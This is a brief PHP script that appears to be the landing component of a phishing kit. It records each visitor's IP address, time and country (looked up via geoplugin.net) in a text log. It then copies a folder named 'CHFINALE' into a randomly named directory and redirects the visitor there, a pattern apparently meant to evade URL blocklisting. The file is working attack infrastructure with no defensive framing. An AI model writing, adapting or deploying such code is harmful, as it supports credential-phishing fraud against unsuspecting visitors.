<?php
/// TIME
date_default_timezone_set('GMT');
$TIME = date("d-m-Y H:i:s"); 

/// COUNTRY
$PP = getenv("REMOTE_ADDR");
$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$PP");
$COUNTRY = $J7->geoplugin_countryName ; // Country

/// VISITOR
$ip = getenv("REMOTE_ADDR");
$file = fopen("ZA2IR.txt","a");
fwrite($file,$ip."  -   ".$TIME." -  " . $COUNTRY ."\n")  ;
?>
<?php

$random = rand(0,100000).$_SERVER['REMOTE_ADDR'];
$dst		= substr(md5($random), 0, 5);
	
function recurse_copy($src, $dst) {

	$dir = opendir($src);
	$result = ($dir === false ? false : true);

	if ($result !== false) {
		$result = @mkdir($dst);

		if ($result === true) {
			while(false !== ( $file = readdir($dir)) ) { 
				if (( $file != '.' ) && ( $file != '..' ) && $result) { 
					if ( is_dir($src . '/' . $file) ) { 
						$result = recurse_copy($src . '/' . $file,$dst . '/' . $file); 
					} else { 
						$result = copy($src . '/' . $file,$dst . '/' . $file); 
					} 
				} 
			} 
			closedir($dir);
		}
	}

	return $result;
}

$src="CHFINALE";
recurse_copy( $src, $dst );
header("location:".$dst."");
exit;

?>